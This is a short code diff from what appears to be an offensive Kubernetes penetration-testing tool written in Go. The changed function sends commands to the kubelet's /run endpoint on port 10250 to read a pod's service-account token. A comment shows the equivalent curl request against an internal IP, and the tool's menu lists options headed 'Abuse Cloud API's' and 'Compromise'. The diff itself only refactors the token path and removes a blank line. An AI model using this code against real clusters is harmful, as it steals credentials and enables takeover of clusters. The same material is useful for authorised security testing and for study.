@@ -885,8 +885,7 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Servic
 								// curl -sk https://10.23.58.41:10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/ -d \"cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token\""
 
 								data := url.Values{}
-								data.Set("cmd", "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
-								// data.Set("cmd", "hostname")
+								data.Set("cmd", "cat "+ServiceAccountPath+"token")
 
 								urlExecPod := "https://" + addr.Address + ":10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/"
 
@@ -983,7 +982,6 @@ Interrogate/Abuse Cloud API's   |
 --------------------------------+
 [17] List AWS S3 Buckets accessible (Auto-Refreshing Metadata API credentials) [aws-s3-ls]
 [18] List contents of an AWS S3 Bucket (Auto-Refreshing Metadata API credentials) [aws-s3-ls-objects]
-
 -----------+
 Compromise |
 -----------+
